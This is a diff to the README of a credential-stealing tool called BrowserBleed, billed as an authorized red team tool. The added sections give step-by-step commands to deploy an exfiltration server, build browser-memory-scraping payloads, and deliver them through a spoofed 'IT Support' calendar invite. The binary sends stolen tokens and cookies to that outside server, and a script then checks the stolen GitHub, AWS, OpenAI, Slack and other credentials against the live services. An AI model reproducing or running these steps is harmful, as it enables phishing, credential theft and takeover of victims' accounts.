@@ -6,6 +6,40 @@ Authorized red team tool for extracting credentials, session tokens, and cookies
 
 ---
 
+## Quick Start
+
+```bash
+# 1. Clone and install runtime dependency
+git clone https://github.com/andrewhannaford/BrowserBleed && cd BrowserBleed
+pip3 install cryptography
+
+# 2. Deploy the report server (one time — needs AWS CLI + a domain in Route 53)
+cp deploy/config.example deploy/config   # fill in DOMAIN, BB_API_KEY, ENCRYPTION_KEY
+bash deploy/provision.sh                 # spin up EC2, configure nginx + TLS
+bash deploy/setup-server.sh
+bash deploy/deploy-binary.sh             # cross-compile and deploy the Go binary
+
+# 3. Build a payload for your target platform and upload it to the server
+.\build_windows.ps1 -Preset chrome -Upload    # Windows (PowerShell)
+./build_mac.sh --preset chrome --upload       # macOS
+sudo ./build_linux.sh --preset chrome --upload  # Linux
+
+# 4. Deliver — copy the smart link from the Payloads page, or send via calendar invite
+python3 invite.py --preset chrome \
+    --from-name "IT Support" --from-email it@corp.com \
+    --to target@corp.com --send \
+    --provider gmail --smtp-user you@gmail.com --smtp-pass "app-password"
+
+# 5. View results at your report server (log in with BB_API_KEY)
+
+# 6. Validate live credentials from a results CSV
+python3 sessiontest.py bb_results.csv
+```
+
+No flags needed on the target — when a server is baked in the binary exfils automatically and exits. See [Building your own binaries](#building-your-own-binaries) for full build options.
+
+---
+
 ## Attack Overview
 
 Modern browsers hold decrypted credentials, session tokens, JWTs, and auth cookies entirely in process memory during an active session. An attacker or red teamer with local administrator access (Windows) or root (macOS/Linux) can read the virtual address space of every browser process, extract live credentials without touching disk, and use them to impersonate the victim across any service whose tokens appear in memory — regardless of whether the user's disk is encrypted.
@@ -275,6 +309,38 @@ When running from source:
 ```bash
 sudo python3 BrowserBleed_linux.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
 ```
+
+### Credential Validation — `sessiontest.py`
+
+Reads a `bb_results.csv` produced by any extractor and tests each credential live against its service. No extra dependencies — stdlib only (Playwright optional for cookie replay).
+
+```bash
+python3 sessiontest.py                      # auto-discovers bb_results.csv in cwd
+python3 sessiontest.py /path/to/results.csv # explicit path
+python3 sessiontest.py --json               # machine-readable JSON output
+python3 sessiontest.py --delay 1.0          # add delay between requests (rate limiting)
+python3 sessiontest.py --timeout 30         # per-request timeout in seconds (default: 10)
+python3 sessiontest.py --no-verify-ssl      # skip TLS verification
+python3 sessiontest.py --browser            # replay session cookies via Playwright
+                                            # (requires: pip3 install playwright &&
+                                            #            python3 -m playwright install chromium)
+```
+
+Supported checks:
+
+| Credential type | What's verified |
+|-----------------|-----------------|
+| GitHub token (`ghp_`, `gho_`, etc.) | Identity, email, org membership, private repo access |
+| Google OAuth2 (`ya29.`) | Token validity, account email |
+| Slack token (`xoxb-`, `xoxp-`, etc.) | Team, user, token type |
+| Anthropic API key | Validity, available models |
+| OpenAI API key | Validity, available models |
+| HuggingFace token | Identity, org membership |
+| Stripe key | Account, live vs. test mode |
+| npm token | Identity |
+| AWS access key | Caller identity via STS (SigV4 signed) |
+| JWT | Expiry check, issuer identification |
+| Session cookies | HTTP probe against known endpoints (GitHub, Google, Slack, Discord, Twitter/X) |
 
 ---
 
@@ -654,6 +720,24 @@ Disk extraction reads unencrypted `cookies.sqlite` from each browser's profile. 
 | Tor Browser | ✓ | ✓ | ✓ |
 
 All Firefox-family browsers are deduped — if two browsers share the same profile directory, it's only processed once.
+
+---
+
+## Development & Testing
+
+```bash
+# Install dependencies
+pip3 install cryptography pytest
+
+# Run the test suite (412 tests — covers all three extractors + sessiontest.py)
+python3 -m pytest tests.py -v
+
+# Windows API tests (process enumeration, memory scraping) are automatically
+# skipped on Linux/macOS. Playwright tests require:
+#   pip3 install playwright && python3 -m playwright install chromium
+```
+
+CI runs automatically on every push and PR via GitHub Actions (`.github/workflows/tests.yml`).
 
 ---
 
